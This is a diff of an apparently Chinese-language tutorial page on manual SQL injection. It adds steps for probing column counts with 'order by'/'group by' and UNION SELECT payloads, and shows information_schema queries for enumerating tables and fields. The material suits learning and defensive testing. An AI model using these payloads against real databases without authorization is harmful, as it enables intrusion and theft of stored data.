@@ -658,12 +658,14 @@
 1&#39; or 1&#x3D;1#　　　　　　　　　#完整语句 select username,age from userinfo where id&#x3D;&#39;&#39; or 1&#x3D;1#&#39;
 1&#39;&#x3D;0 #　　　　　　　　　　　　#完整语句 select username,age from userinfo where id&#x3D;&#39;&#39;&#x3D;0#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><code>1&#39; order by n</code> 判断字段数，当n回显正常，n+1报错，即n是字段数</p>
+<p><code>1&#39; order by n --+</code> 或者 <code>1&#39; group by n --+</code> 判断字段数，当n回显正常，n+1报错，即n是字段数</p>
 <p><font color='red'>注意事项：</font></p>
 <ul>
 <li>在手工注入时，字符串为表名要加反引号</li>
 </ul>
-<h4 id="1-Union-联合查询"><a href="#1-Union-联合查询" class="headerlink" title="1.Union(联合查询)"></a>1.Union(联合查询)</h4><p>union联合查询，若前者查询失败则会显示后者查询的结果<br>进而利用select 1,2,3,…… 找到可以显示的字段号，例如2,3 即可在2,3位置替换成相应的函数<br>例如<code>database()</code>数据库名称,<code>version()</code>版本</p>
+<h4 id="1-Union-联合查询"><a href="#1-Union-联合查询" class="headerlink" title="1.Union(联合查询)"></a>1.Union(联合查询)</h4><p>union联合查询，若前者查询失败则会显示后者查询的结果<br>进而利用select 1,2,3,…… 找到可以显示的字段号，例如2,3 即可在2,3位置替换成相应的函数</p>
+<p><code>-1&#39; union select 1,2,3 --+</code> or <code>-1&#39; union select 1,2,&#39;3</code>进行闭合</p>
+<p>例如<code>database()</code>数据库名称,<code>version()</code>版本</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">查询有哪些表：
 group_concat(&#39;&lt;br&gt;&#39;,table_name) from information_schema.tables where table_schema&#x3D;database()
 查询表中字段：
